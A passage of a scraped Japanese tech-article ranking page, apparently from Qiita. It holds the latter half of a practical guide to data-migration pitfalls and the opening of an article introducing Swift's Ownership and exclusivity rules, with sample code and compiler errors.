<span id="ありがちなこと-3" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-3"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>当初に見積もった作業時間より大幅に伸びる
エラーが出まくる</li>
<li>サーバにつながらない</li>
<li>当日の移行作業タスクに穴がある</li>
<li>リハーサルできなかった部分でサービスイン当日に大失敗</li>
<li>リハーサルまでに移行プログラムのテストまで終わらせていない</li>
</ul>

<h2>
<span id="みんなを巻き込もう" class="fragment"></span><a href="#%E3%81%BF%E3%82%93%E3%81%AA%E3%82%92%E5%B7%BB%E3%81%8D%E8%BE%BC%E3%82%82%E3%81%86"><i class="fa fa-link"></i></a>みんなを巻き込もう</h2>

<p>データ移行ではほぼ確実にデータ修正が入るので、<br>
既存システムの利用者に影響が出ます。<br>
利用者を巻き込みましょう。</p>

<p>また移行用プログラムを動かすだけでも、<br>
インフラ、ネットワークエンジニアの力を借りることになります。<br>
早めにお話しましょう。</p>

<h3>
<span id="ありがちなこと-4" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-4"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>利用者側の改修が直前になって発生</li>
<li>インフラの手配が遅れ、実行環境が準備できずスケジュール遅延</li>
</ul>

<h1>
<span id="既存データの内容編" class="fragment"></span><a href="#%E6%97%A2%E5%AD%98%E3%83%87%E3%83%BC%E3%82%BF%E3%81%AE%E5%86%85%E5%AE%B9%E7%B7%A8"><i class="fa fa-link"></i></a>既存データの内容編</h1>

<h2>
<span id="既存データを一通り目視確認しよう" class="fragment"></span><a href="#%E6%97%A2%E5%AD%98%E3%83%87%E3%83%BC%E3%82%BF%E3%82%92%E4%B8%80%E9%80%9A%E3%82%8A%E7%9B%AE%E8%A6%96%E7%A2%BA%E8%AA%8D%E3%81%97%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>既存データを一通り目視確認しよう</h2>

<p>既存データには、必ず当初の想定から外れたデータが入っています。<br>
これは自然の摂理です。</p>

<p>全件確認が最も確実ですが、<br>
件数からみて難しそうならサンプリングや統計をとってデータを目視確認しましょう。<br>
実際のデータを一覧化して眺めると、いろいろなことがわかってきます。</p>

<h3>
<span id="ありがちなこと-5" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-5"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>移行プログラムを流すたびにエラーが起きる</li>
<li>データを確認したところ既存システムのバグが新たに見つかり時間を取られる</li>
<li>謎の値がやけに多い</li>
</ul>

<h2>
<span id="想定を定義して全件確認しよう" class="fragment"></span><a href="#%E6%83%B3%E5%AE%9A%E3%82%92%E5%AE%9A%E7%BE%A9%E3%81%97%E3%81%A6%E5%85%A8%E4%BB%B6%E7%A2%BA%E8%AA%8D%E3%81%97%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>想定を定義して全件確認しよう</h2>

<p>例えばIDなら文字列型...だけではなく、<br>
桁数、IDの形式といったものを定義し(型システム..?)、全データをチェックしましょう。<br>
Check制約が効いていたとしても、<br>
「このデータがこれなら、こちらのデータはこうなってないといけない」といったものもあるかもしれません。<br>
全カラムに対して定義内に収まるか確認することをおすすめします。</p>

<h3>
<span id="ありがちなこと-6" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-6"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>桁数がおかしいデータがある</li>
<li>データが空</li>
<li>なんじゃこりゃ</li>
</ul>

<h2>
<span id="データの分布濃度を確認しよう" class="fragment"></span><a href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%81%AE%E5%88%86%E5%B8%83%E6%BF%83%E5%BA%A6%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%97%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>データの分布（濃度）を確認しよう</h2>

<p>各カラムにおいて、ある特定のデータがやたら多いことがあります。<br>
想定より多い場合、特殊な用途として使われている可能性を考慮しないといけません。<br>
仮の例として、<br>
「顧客IDのうち上3桁000が多い。実は、普段はE2Cの業務だが法人対応のため法人顧客000にして運用している。」<br>
といったように、機能不足を運用でカバーしている可能性があります。<br>
他にはデフォルト値や管理アカウントを指しているかもしれません。<br>
その他の問題として、データが偏っていると、新しいシステムでの検索速度に影響が出てしまいます。<br>
インデックス(または相当のなにか)を使った動作が遅くなるためです。</p>

<h3>
<span id="ありがちなこと-7" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-7"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>ばらつきのあるはずのデータがばらついていない</li>
<li>選択式のデータの比率が想定と異なる</li>
</ul>

<h2>
<span id="空データデフォルト値" class="fragment"></span><a href="#%E7%A9%BA%E3%83%87%E3%83%BC%E3%82%BF%E3%83%87%E3%83%95%E3%82%A9%E3%83%AB%E3%83%88%E5%80%A4"><i class="fa fa-link"></i></a>空データ、デフォルト値</h2>

<p>デフォルト値や空文字、空白、nullについて、現行システムと新システムで扱いが違う場合は要注意です。<br>
動作が変わるのに誰も気づいていないかもしれません。</p>

<h3>
<span id="ありがちなこと-8" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-8"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>デフォルト値が新旧で異なるが誰も気づいていない</li>
<li>空文字やnullの扱いが新旧で異なるが誰も気づいていない</li>
</ul>

<h2>
<span id="文字集合に気をつけよう" class="fragment"></span><a href="#%E6%96%87%E5%AD%97%E9%9B%86%E5%90%88%E3%81%AB%E6%B0%97%E3%82%92%E3%81%A4%E3%81%91%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>文字集合に気をつけよう</h2>

<p>既存と新規のデータベースとプログラム、加えて移行プログラムではどんな文字を扱うか答えられますか？<br>
日本語？日本語ってなんだろう。<br>
認識を合わせないと文字化けが発生してしまいます。<br>
なお、コンソールやエディタ、フロント画面で表示されるテキストは、想定通りとは限りません。</p>

<h3>
<span id="ありがちなこと-9" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-9"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>CP932で拡張された文字が移行できない(丸囲いの1、「﨑」といった一部の異体字、「☃」など)</li>
<li>絵文字🍣などUnicodeのいろいろな闇文字が移行できない</li>
<li>エディタ上の表示とバイナリ表示が異なる</li>
<li>フリー入力欄として登録済みの文字が。。</li>
</ul>

<h2>
<span id="せっかくなのでデータをきれいにしてみよう" class="fragment"></span><a href="#%E3%81%9B%E3%81%A3%E3%81%8B%E3%81%8F%E3%81%AA%E3%81%AE%E3%81%A7%E3%83%87%E3%83%BC%E3%82%BF%E3%82%92%E3%81%8D%E3%82%8C%E3%81%84%E3%81%AB%E3%81%97%E3%81%A6%E3%81%BF%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>せっかくなのでデータをきれいにしてみよう</h2>

<p>普段の業務ではおかしいデータを直す機会はなかなかありません。<br>
せっかくなのでデータ移行のタイミングでクレンジングしてみましょう。</p>

<h3>
<span id="ありがちなこと-10" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-10"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>本番データなのにテスト時にできたデータだらけ</li>
<li>よくみたら検証用データなので消せない</li>
</ul>

<h1>
<span id="移行プログラム編" class="fragment"></span><a href="#%E7%A7%BB%E8%A1%8C%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E7%B7%A8"><i class="fa fa-link"></i></a>移行プログラム編</h1>

<h2>
<span id="開発ステージング環境を用意しよう" class="fragment"></span><a href="#%E9%96%8B%E7%99%BA%E3%82%B9%E3%83%86%E3%83%BC%E3%82%B8%E3%83%B3%E3%82%B0%E7%92%B0%E5%A2%83%E3%82%92%E7%94%A8%E6%84%8F%E3%81%97%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>開発、ステージング環境を用意しよう</h2>

<p>移行プログラムもそれ自体テストが必要です。<br>
また、既存システムの開発とステージングのデータも移行するべきです。<br>
環境を用意しましょう。</p>

<h2>
<span id="データ移行時間を見積もろう" class="fragment"></span><a href="#%E3%83%87%E3%83%BC%E3%82%BF%E7%A7%BB%E8%A1%8C%E6%99%82%E9%96%93%E3%82%92%E8%A6%8B%E7%A9%8D%E3%82%82%E3%82%8D%E3%81%86"><i class="fa fa-link"></i></a>データ移行時間を見積もろう</h2>

<p>データ移行プログラムの実行完了まで果たして現実的な時間で終わるでしょうか？<br>
開発やステージングから見積ったとしても、データ件数や偏り、サーバースペックも違うので参考になりません。<br>
チューニングは必須ですし、プログラム実行より前にできるタスクを洗い上げて移行時間を短縮しましょう。</p>

<h3>
<span id="ありがちなこと-11" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-11"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>本番だとデータ移行プログラムが数十時間かかる</li>
<li>データ移行日より前に作業可能なタスクを洗い出していない</li>
</ul>

<h2>
<span id="パフォーマンスをあげよう" class="fragment"></span><a href="#%E3%83%91%E3%83%95%E3%82%A9%E3%83%BC%E3%83%9E%E3%83%B3%E3%82%B9%E3%82%92%E3%81%82%E3%81%92%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>パフォーマンスをあげよう</h2>

<p>移行プログラムはOLAP的な大容量データ操作になるため、<br>
WebアプリケーションのようなOLTP処理とポイントが異なる部分があります。<br>
地道に改善していきましょう。プログラムを並列に動かしてもOKですよ。</p>

<h3>
<span id="ありがちなこと-12" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-12"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>データ移行元、移行先、移行用環境についてOLAP処理向けのパフォーマンスチューニングしていない</li>
<li>プログラム上で全データを一括で取得してしまい、メモリがパンクする</li>
<li>移行用プログラムで新しく必要になりそうなインデックスがデータ取得元にない</li>
<li>データ取得元で全件ソートしている。ソート不要なのにソートしている

<ul>
<li>特にMySQLの場合、ソート時に使う一時テーブルの使用量が多すぎると<br>
一時テーブルがMyISAM(5.7からはInnoDB)化し、ディスク容量を激しく消費するリスクがあります</li>
</ul>
</li>
<li>1つのトランザクションで全データを一括投入してしまい、処理が終わらない</li>
</ul>

<h2>
<span id="ログを厚めに出そう" class="fragment"></span><a href="#%E3%83%AD%E3%82%B0%E3%82%92%E5%8E%9A%E3%82%81%E3%81%AB%E5%87%BA%E3%81%9D%E3%81%86"><i class="fa fa-link"></i></a>ログを厚めに出そう</h2>

<p>時間がかかるデータ移行処理。<br>
ログがないと今どこまで進んだのかわかりません。<br>
エラー時にどこで間違ったのかもわかりません。<br>
移行プログラムに関しては、ログローテーションがほぼ不要なこともあり、<br>
本番でもINFOレベルのログを全部出すつもりで。</p>

<h3>
<span id="ありがちなこと-13" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-13"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>ログがなくて今何が起きているかわからない</li>
<li>ログがなくて何が起きたのかわからない</li>
<li>どこで失敗したのかわからない</li>
</ul>

<h2>
<span id="中間ファイルを作ろう" class="fragment"></span><a href="#%E4%B8%AD%E9%96%93%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E4%BD%9C%E3%82%8D%E3%81%86"><i class="fa fa-link"></i></a>中間ファイルを作ろう</h2>

<p>エラー時に全作業のやり直しは避けたいところ。<br>
データ加工時に中間ファイルを作っておけば、その中間ファイルから作業をやり直すことができます。<br>
中間ファイル自体をチェックすることでエラーの原因追求もできます。</p>

<h3>
<span id="ありがちなこと-14" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-14"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>処理に失敗したので一からデータ移行やり直し</li>
<li>移行プログラムのうちどこで誤ったのかわからない</li>
</ul>

<h2>
<span id="データの互換性を確認しよう" class="fragment"></span><a href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%81%AE%E4%BA%92%E6%8F%9B%E6%80%A7%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%97%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>データの互換性を確認しよう</h2>

<p>既存のデータを新システムに投入できるようにすることは、<br>
移行プログラムの存在意義である以上できているはずです。<br>
ただし、既存と新システムを並行稼動させるときは、<br>
新データの形式(長さ、文字集合などなど)が既存システムにも適合できるようにしないといけません。</p>

<h3>
<span id="ありがちなこと-15" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-15"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>旧データより新データのほうが受け入れ可能な文字列長が長いため、既存システムに新データを投入することが出来ない</li>
<li>ユニーク制約に引っかかる</li>
</ul>

<h2>
<span id="データベースのマイグレーション" class="fragment"></span><a href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E3%83%9E%E3%82%A4%E3%82%B0%E3%83%AC%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a>データベースのマイグレーション</h2>

<p>システム移行ともに、普段なかなかできないDBMSのバージョンアップやソフトウェア自体を変更することが多いはずです。<br>
各DBMSのマニュアルやガイドを参考にして、粛々と行いましょう。</p>

<h3>
<span id="ありがちなこと-16" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-16"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>暗黙のデフォルト処理にハマる</li>
<li>マニュアルを読まない</li>
</ul>

<h2>
<span id="移行済みデータを全件検証しよう" class="fragment"></span><a href="#%E7%A7%BB%E8%A1%8C%E6%B8%88%E3%81%BF%E3%83%87%E3%83%BC%E3%82%BF%E3%82%92%E5%85%A8%E4%BB%B6%E6%A4%9C%E8%A8%BC%E3%81%97%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>移行済みデータを全件検証しよう</h2>

<p>バグ、仕様誤りにより、投入したデータが想定通りになってないことはよくあります。<br>
検証までがデータ移行です。</p>

<h3>
<span id="ありがちなこと-17" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-17"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>データ項目が空になっている</li>
<li>件数がおかしい</li>
<li>デフォルト値の考慮漏れ（既存、新規、移行プログラム）</li>
</ul>

<h2>
<span id="etlツールやデータフローツールを使ってみよう" class="fragment"></span><a href="#etl%E3%83%84%E3%83%BC%E3%83%AB%E3%82%84%E3%83%87%E3%83%BC%E3%82%BF%E3%83%95%E3%83%AD%E3%83%BC%E3%83%84%E3%83%BC%E3%83%AB%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6%E3%81%BF%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>ETLツールやデータフローツールを使ってみよう</h2>

<p>上記のような仕組みは、自分たちで実装するより既存のツールを流用したほうがQCDすべて確保できると思います。<br>
クラウドベンダーのツールやOSSのETLツールを検討しましょう</p>

<h2>
<span id="普通のアプリケーションとなるべく同じようにしよう" class="fragment"></span><a href="#%E6%99%AE%E9%80%9A%E3%81%AE%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%A8%E3%81%AA%E3%82%8B%E3%81%B9%E3%81%8F%E5%90%8C%E3%81%98%E3%82%88%E3%81%86%E3%81%AB%E3%81%97%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>普通のアプリケーションとなるべく同じようにしよう</h2>

<p>使い捨てとは言え、移行プログラムも一つのシステムである以上、普通のシステムと同じ部分で問題が発生します。</p>

<ul>
<li>自動デプロイ</li>
<li>集計処理</li>
<li>ログ確認</li>
</ul>

<p>手のかからない範囲で自動化しましょう。</p>

<h3>
<span id="ありがちなこと-18" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-18"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>手作業の誤りで作業やり直し</li>
<li>デプロイが苦行</li>
<li>ログ確認が苦行</li>
<li>テスト、レビューしてない</li>
<li>障害フローがない</li>
</ul>

<h1>
<span id="移行インフラ編" class="fragment"></span><a href="#%E7%A7%BB%E8%A1%8C%E3%82%A4%E3%83%B3%E3%83%95%E3%83%A9%E7%B7%A8"><i class="fa fa-link"></i></a>移行インフラ編</h1>

<h2>
<span id="専用の環境を手配しよう" class="fragment"></span><a href="#%E5%B0%82%E7%94%A8%E3%81%AE%E7%92%B0%E5%A2%83%E3%82%92%E6%89%8B%E9%85%8D%E3%81%97%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>専用の環境を手配しよう</h2>

<p>データを全件移行することから、移行プログラムは重くなりがちです。<br>
流用や相乗りは避け、プログラムを動かす前に新しい環境を準備しておきましょう。<br>
プログラムが正しく動くか検証を忘れずに。</p>

<h3>
<span id="ありがちなこと-19" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-19"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>CPU、メモリ、ディスク、ネットワーク...サーバーのスペックがなにもかも足りない</li>
<li>ネットワークがつながらない</li>
<li>そもそもサーバーがない</li>
</ul>

<h2>
<span id="監視しよう" class="fragment"></span><a href="#%E7%9B%A3%E8%A6%96%E3%81%97%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>監視しよう</h2>

<p>移行プログラムは使い捨てとはいえ、<br>
重い処理なので監視しないと危険です。<br>
どれくらいサーバのリソースを利用するかも含め、<br>
通常のモニタリングと同じぐらいの精度を目標にしたいところ。<br>
移行元データを取得する際は、既存システムに影響がないかも監視しましょう。</p>

<h3>
<span id="ありがちなこと-20" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-20"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>データ移行の負荷で既存システムに影響出まくり</li>
<li>移行関係のデータのせいでディスクフルになりサーバ作り直し</li>
<li>監視はあるけど通知がないのでずっとグラフを見てないといけない</li>
</ul>

<h2>
<span id="バックアップを取ろう" class="fragment"></span><a href="#%E3%83%90%E3%83%83%E3%82%AF%E3%82%A2%E3%83%83%E3%83%97%E3%82%92%E5%8F%96%E3%82%8D%E3%81%86"><i class="fa fa-link"></i></a>バックアップを取ろう</h2>

<p>サーバ障害や手順ミスにより、移行中のデータが消えてしまう。<br>
そんなことになる前に、バックアップをとりましょう。<br>
特に移行プログラムの作りが甘いときは、運用でカバーすることが多いので危険です。</p>

<h3>
<span id="ありがちなこと-21" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-21"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>移行元データが吹っ飛んだので移行やり直しができない</li>
<li>移行用データが吹っ飛んだ</li>
<li>調査用に一時的に作ったファイルが吹っ飛んだ</li>
</ul>

<h2>
<span id="セキュリティを確保しよう" class="fragment"></span><a href="#%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%82%92%E7%A2%BA%E4%BF%9D%E3%81%97%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>セキュリティを確保しよう</h2>

<p>データ移行全般において、調査や集計によりデータがあちこちに散らばりがちです。<br>
セキュリティを忘れないようにしましょう。<br>
あまりやりすぎると移行が進まないのでほどほどに。</p>

<h3>
<span id="ありがちなこと-22" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-22"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>一時ファイルや集計ファイルがPC、共有サーバといったあちこちに散らかっている</li>
</ul>

<h1>
<span id="参考にすべき資料" class="fragment"></span><a href="#%E5%8F%82%E8%80%83%E3%81%AB%E3%81%99%E3%81%B9%E3%81%8D%E8%B3%87%E6%96%99"><i class="fa fa-link"></i></a>参考にすべき資料</h1>

<p><a href="http://itpro.nikkeibp.co.jp/article/COLUMN/20080303/295290/" rel="nofollow noopener" target="_blank">最後の難関 システム移行</a>ぐらいで、<br>
データ移行そのものはあまり情報がありません。<br>
書籍も少ないような気がします。秘伝の技ですね。</p>

<p>DBマイグレーションだけならそれなりに情報がありますが、<br>
技術上解決できる問題なので、そこで詰まることは少ないと思います。</p>

<p>データ移行とは直接関係しませんが、<br>
ビッグデータのETL関係の資料は、<br>
移行プログラム関係の一部のトピックと関連があり、ためになります。</p>

<h2>
<span id="関連記事" class="fragment"></span><a href="#%E9%96%A2%E9%80%A3%E8%A8%98%E4%BA%8B"><i class="fa fa-link"></i></a>関連記事</h2>

<ul>
<li><a href="https://qiita.com/yoshi-taka/items/3628c5d4240fbff02134" id="reference-4a2ae2f3ac540c4b6642">SELECT権限だけでmysqldumpできることがある - Qiita</a></li>
<li><a href="https://qiita.com/yoshi-taka/items/94467014ec7e9e3e8ec8" id="reference-cb01b7bc99974da8dd90">MySQL権限一覧をきれいに作る方法と、rootユーザー以外で棚卸しする方法 - Qiita</a></li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">95位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>93</kbd>
		<a target="_blank" href="https://qiita.com/omochimetaru/items/c5f0eabde516e4713367">Swift に導入予定の Ownership 機能の紹介</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-26<br />00:12:23</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/20130.html">omochimetaru</a>(35件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/20130/profile-images/1473682917">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Swift]</b> <b>[swtws]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="この記事について" class="fragment"></span><a href="#%E3%81%93%E3%81%AE%E8%A8%98%E4%BA%8B%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>この記事について</h1>

<p>この記事は <a href="https://swift-tweets.github.io" rel="nofollow noopener" target="_blank">Swift Tweets 2017 Fall</a> での発表内容を記事の形で再編したものです。</p>

<p><a href="https://togetter.com/li/1163227" rel="nofollow noopener" target="_blank">togetterまとめはこちら</a>。</p>

<h1>
<span id="導入" class="fragment"></span><a href="#%E5%B0%8E%E5%85%A5"><i class="fa fa-link"></i></a>導入</h1>

<p>Swiftはネイティブコンパイルや値型など、高速な動作を意識して設計されていますが、CPUの性能を活かしきるコードを書くには機能が足りていません。コアチームは、その不足している機能群のうち、あるグループに Ownership 機能と名前をつけ、今後の対応方針を <a href="https://github.com/apple/swift/blob/master/docs/OwnershipManifesto.md" rel="nofollow noopener" target="_blank">Ownership Manifesto</a> として文書化しました。</p>

<p>この記事では、この文書に基づいて Ownership 機能を紹介します。その内容のうち、すでにSwiftに導入されているものもありますが、そうでないものについては、あくまで方向性が提示されているものであり、確定した仕様ではないことに注意してください。</p>

<h1>
<span id="ownership" class="fragment"></span><a href="#ownership"><i class="fa fa-link"></i></a>Ownership</h1>

<p>Ownership は主にコピーの回避を実現します。これまで「コピーしていた」場面で、そのかわりに「貸したり」「渡したり」できるようにして、より高速なコードを書けるようにします。</p>

<h2>
<span id="コピーコスト" class="fragment"></span><a href="#%E3%82%B3%E3%83%94%E3%83%BC%E3%82%B3%E3%82%B9%E3%83%88"><i class="fa fa-link"></i></a>コピーコスト</h2>

<p>つまり前提として、コピーについてのコスト意識があります。</p>

<p>値型がコピーされるときは、その全ての stored property がコピーされます。参照型がコピーされるときは、参照カウンタの増加が起きます。</p>

<p>値がコピーされた数だけ、それが破棄される可能性があります。値型が破棄されるときは、その全ての stored property が破棄されます。参照型が破棄されるときは、参照カウンタの減少が起こり、もしそれが 0 になると、stored property の破棄とヒープメモリの解放処理が起きます。</p>

<p>これらの処理は stored property を通じて連鎖するので、型のサイズに応じてコストが大きくなります。こうした場面で、不要なコピーが生じないコードを書く手段が提供されます。</p>

<h1>
<span id="排他則" class="fragment"></span><a href="#%E6%8E%92%E4%BB%96%E5%89%87"><i class="fa fa-link"></i></a>排他則</h1>

<p>Ownership Manifesto では大きく分けて3つの機能が提案されています。第1の機能は、値アクセスの排他則というものです。原文では Law of Exclusivity と書かれています。</p>

<p>排他則とは、ある値への書き込みアクセスが存在するとき、そのアクセスが排他的である事を強制し、その他のアクセスが同時に生じる事を禁止するものです。</p>

<p>これは、今後の機能追加にあたって、その安全性のために先立って必要なもので、現在のSwiftにすでに導入されています。ただ、この機能それ自体も、コンパイル最適化のチャンスを与えるため、高速化に貢献するとされています。</p>

<p>この制約は、コンパイルエラーや実行時エラーとして実現されます。</p>

<p>書き込みアクセスには以下のようなものがあります。</p>

<ul>
<li>変数への代入</li>
<li>関数のinout引数に変数を渡す</li>
<li>mutating func なメソッドを呼ぶ(レシーバに対する書き込みアクセス)</li>
</ul>

<h2>
<span id="排他則の適用例" class="fragment"></span><a href="#%E6%8E%92%E4%BB%96%E5%89%87%E3%81%AE%E9%81%A9%E7%94%A8%E4%BE%8B"><i class="fa fa-link"></i></a>排他則の適用例</h2>

<p>例えば、以下のコードはエラーになります。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">func</span> <span class="nf">f0</span><span class="p">(</span><span class="kc">_</span> <span class="n">a</span><span class="p">:</span> <span class="kr">inout</span> <span class="nb">Int</span><span class="p">,</span> <span class="kc">_</span> <span class="n">b</span><span class="p">:</span> <span class="kr">inout</span> <span class="nb">Int</span><span class="p">)</span> <span class="p">{}</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nv">x</span><span class="p">:</span> <span class="nb">Int</span> <span class="p">=</span> <span class="mi">3</span>
    <span class="n">f0</span><span class="p">(&amp;</span><span class="n">x</span><span class="p">,</span> <span class="p">&amp;</span><span class="n">x</span><span class="p">)</span>
<span class="p">}</span>

<span class="n">main</span><span class="p">()</span>
</pre></div></div>

<p>以下のエラーメッセージが出ます。</p>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">error.txt</span></div>
<div class="highlight"><pre><span></span>/Users/omochi/github/omochi/swift-ownership-example/x01_loe-inout/Sources/x01_loe-inout/main.swift:5:12: error: inout arguments are not allowed to alias each other
    f0(&amp;x, &amp;x)
           ^~
/Users/omochi/github/omochi/swift-ownership-example/x01_loe-inout/Sources/x01_loe-inout/main.swift:5:8: note: previous aliasing argument
    f0(&amp;x, &amp;x)
       ^~
/Users/omochi/github/omochi/swift-ownership-example/x01_loe-inout/Sources/x01_loe-inout/main.swift:5:8: error: overlapping accesses to 'x', but modification requires exclusive access; consider copying to a local variable
    f0(&amp;x, &amp;x)
       ^~
/Users/omochi/github/omochi/swift-ownership-example/x01_loe-inout/Sources/x01_loe-inout/main.swift:5:12: note: conflicting access is here
    f0(&amp;x, &amp;x)
           ^~
</pre></div>
</div>

<p>2つの inout 引数に同じ変数 x を渡しているので、変数 x の値への書き込みアクセスが同時に2つ存在してしまうからです。</p>

<p>以下のコードもエラーになります。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">struct</span> <span class="nc">Cat</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nv">age</span><span class="p">:</span> <span class="nb">Int</span> <span class="p">=</span> <span class="mi">3</span>
    <span class="kr">mutating</span> <span class="kd">func</span> <span class="nf">updateAge</span><span class="p">(</span><span class="kc">_</span> <span class="n">f</span><span class="p">:</span> <span class="p">()</span> <span class="p">-&gt;</span> <span class="nb">Int</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">age</span> <span class="p">=</span> <span class="n">f</span><span class="p">()</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nv">cat</span> <span class="p">=</span> <span class="n">Cat</span><span class="p">()</span>
    <span class="n">cat</span><span class="p">.</span><span class="n">updateAge</span> <span class="p">{</span>
